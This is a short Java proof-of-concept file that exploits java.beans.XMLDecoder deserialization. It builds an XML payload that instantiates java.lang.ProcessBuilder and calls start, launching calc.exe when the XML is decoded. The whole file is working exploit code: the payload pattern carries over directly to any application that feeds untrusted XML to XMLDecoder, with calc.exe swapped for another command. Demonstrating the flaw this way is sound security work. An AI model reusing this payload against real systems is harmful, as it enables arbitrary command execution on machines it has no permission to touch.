package com.company;

import java.beans.XMLDecoder;
import java.io.ByteArrayInputStream;

public class PocUsingBytes
{
    public static void main(String[] args)
    {
        String className  = "java.lang.ProcessBuilder";
        String firstParam = "c:\\Windows\\System32\\calc.exe";
        String methodName  = "start";

        String xmlPayload = "<?xml version=\"1.0\"?><java>  " +
                            "<object class=\""+className+"\">" +
                                "<array class=\"java.lang.String\" length=\"1\" >"+
                                    "<void index=\"0\">   " +
                                        "<string>" + firstParam + "</string>" +
                                    "</void>" +
                                "</array>" +
                                "<void method=\""+ methodName + "\" /> "+
                            "</object></java>";

        new XMLDecoder(new ByteArrayInputStream(xmlPayload.getBytes())).readObject();
        System.out.println("...done");
    }
}
